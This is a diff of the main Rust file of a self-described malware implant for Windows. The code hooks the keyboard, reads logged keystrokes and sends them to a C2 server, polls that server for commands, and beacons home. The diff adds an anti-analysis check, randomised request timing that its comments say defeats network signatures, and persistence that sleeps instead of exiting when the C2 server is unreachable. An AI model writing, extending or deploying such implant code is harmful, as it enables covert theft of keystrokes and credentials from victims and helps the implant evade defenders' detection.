@@ -1,9 +1,9 @@
 mod server;
 mod system;
 mod encode;
-use std::{sync::Arc, u32};
-use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour};
-use tokio::time::{sleep, Duration, Sleep};
+use std::{sync::Arc};
+use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour, setup_malware};
+use tokio::time::{sleep, Duration};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};
 
@@ -49,7 +49,7 @@ async fn main() {
 
     // //anti sandbox
     // // sleep(Duration::from_secs(600)).await;
-
+    //setup_malware();
     check_for_analysis_behaviour();
 
     const URL: &'static str = "http://127.0.0.1:5000";
@@ -71,7 +71,7 @@ iwIDAQAB
 
     let mut counter_beconing = 0;
 
-    //sends the intial request to register themselves
+    //Are pointers to the original resource to make it usable for async code
     let id: String = unwrap_or_panic!(server.register(arch).await);
 
     let server_for_beconing = Arc::clone(&server);
@@ -84,6 +84,8 @@ iwIDAQAB
     let id_command = id.clone();
 
     let paused_hook = Arc::clone(&paused);
+    let paused_command = Arc::clone(&paused);
+    let paused_exfil = Arc::clone(&paused);
 
     //thread that handels keyboard hooks
     tokio::spawn(async move {
@@ -94,18 +96,22 @@ iwIDAQAB
             }
 
             unsafe {
+                //hooks the keyboard callback
                 set_windows_hook();
             }
             break;
         }
     });
 
-    let paused_command = Arc::clone(&paused);
+
     
-    //thread that requests server
+    //spawns a thread that continually requests for commands 
     tokio::spawn(async move {
+        //create ranom number generator
         let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         loop {
+
+            //used to pause commands
             if paused_command.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
@@ -113,44 +119,54 @@ iwIDAQAB
             
             let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
             execute_command(&rec, paused_command.clone()).await;
+
+            //makes it so that the malware sends requests at random intervals.
+            //this makes the malware activity more sparatic, and therefore harder to form network signature
             sleep(Duration::from_secs(rng.gen_range(10..40))).await;
         }
     });
 
 
-    let paused_exfil = Arc::clone(&paused);
-
-    let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
-
     //thread that reads exfill file, and sends it off to the server
     tokio::spawn(async move {
         loop {
+            //create ranom number generator
+            let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
             if paused_exfil.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
             }
 
-            let keys = read_file();
-            if server_for_exfil.send_data(&id_exfil, &keys.clone()).await.is_ok() {
+            let key_stroke = read_file();
+            if server_for_exfil.send_data(&id_exfil, &key_stroke.clone()).await.is_ok() {
                 delete_file();
             }
 
+            //makes it so that the malware sends requests at random intervals.
+            //this makes the malware activity more sparatic, and therefore harder to form network signature
             sleep(Duration::from_secs(rng.gen_range(10..40))).await;
         }
     });
 
     // Main loop for beaconing
     loop {
+        //create ranom number generator
+        let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
+        //sends a becon to the c2 server
+        //if c2 does not respond send 2 more timee
         match server_for_beconing.becon(&id_beconing).await {
             Ok(_) => counter_beconing = 0,
             Err(_) => counter_beconing += 1,
         };
 
+        //if c2 server does not resond sleeps
         if counter_beconing >= 2 {
-            std::process::exit(1);
+            sleep(Duration::from_secs(200)).await;
         }
 
-        sleep(Duration::from_secs(30)).await;
+        //makes it so that the malware sends requests at random intervals.
+        //this makes the malware activity more sparatic, and therefore harder to form network signature
+        sleep(Duration::from_secs(rng.gen_range(10..40))).await;
     }
 }
 
